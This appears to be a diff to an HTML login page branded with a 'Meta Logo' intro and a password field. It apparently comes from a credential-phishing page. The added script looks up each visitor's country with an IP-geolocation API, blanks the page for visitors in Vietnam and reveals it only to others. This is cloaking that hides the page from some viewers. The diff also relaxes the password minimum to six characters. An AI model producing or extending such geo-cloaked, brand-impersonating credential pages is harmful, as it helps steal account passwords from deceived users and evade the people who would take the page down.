@@ -17,19 +17,32 @@
         width: 50%;
         height: auto;
     }
+    body {
+        display: none; /* Ẩn toàn bộ trang ban đầu */
+    }
 </style>
 <div id="intro">
     <img id="meta-logo" src="./img/loadingLogo.gif" alt="Meta Logo">
 </div>
-
 <script>
-    // Ẩn intro sau 2 giây khi trang đã tải xong
-    window.onload = () => {
-        setTimeout(() => {
-            document.getElementById('intro').style.display = 'none';
-        }, 5000); // 2 giây
+    window.onload = async () => {
+        var url = "https://api.db-ip.com/v2/free/self/";
+        const response = await fetch(url);
+        console.log(response);
+        if (response.status == 200) {
+            const data = await response.json();
+            if (data.countryCode != "VN") {
+                document.body.style.display = "block"; 
+                setTimeout(() => {
+                    document.getElementById('intro').style.display = 'none';
+                }, 5000); // 2 giây
+            } else {
+                document.body.innerHTML='';
+            }
+        }
     };
 </script>
+
 <!DOCTYPE html>
 <html lang="en" id="html">
 <head>
@@ -3734,7 +3747,7 @@
                                 <label for="exampleInputPassword" class="form-label">Password</label>
                                 <div style="display: flex; align-items: center;">
                                     <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="8" maxlength="30"
+                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
                                         aria-describedby="emailHelp" required
                                         onfocus="this.removeAttribute('readonly');">
                                 </div>
